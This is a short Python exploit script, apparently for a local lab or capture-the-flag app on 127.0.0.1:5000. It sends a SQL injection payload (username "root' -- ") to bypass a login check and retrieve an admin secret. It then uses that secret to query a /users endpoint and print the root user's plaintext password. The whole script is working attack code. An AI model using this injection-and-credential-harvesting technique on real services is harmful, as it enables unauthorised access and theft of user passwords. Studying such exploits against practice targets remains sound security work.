import requests


# http://127.0.0.1:5000/?username=root%27%20--
query_params_secret = {'username': "root' -- ", }
root_secret_response = requests.get('http://127.0.0.1:5000', params=query_params_secret).json()
secret = root_secret_response["secret"]
print(f"Admin secret: {secret}")

# http://127.0.0.1:5000/users?secret=0a216dc6-2dab-47d2-884b-e0ae9e023faf
query_params_users = {'secret': secret}
users_data = requests.get('http://127.0.0.1:5000/users', params=query_params_users).json()
for user in users_data:
    if user['username'] == 'root':
        password = user['password']
        break
print(f"Admin password: {password}")
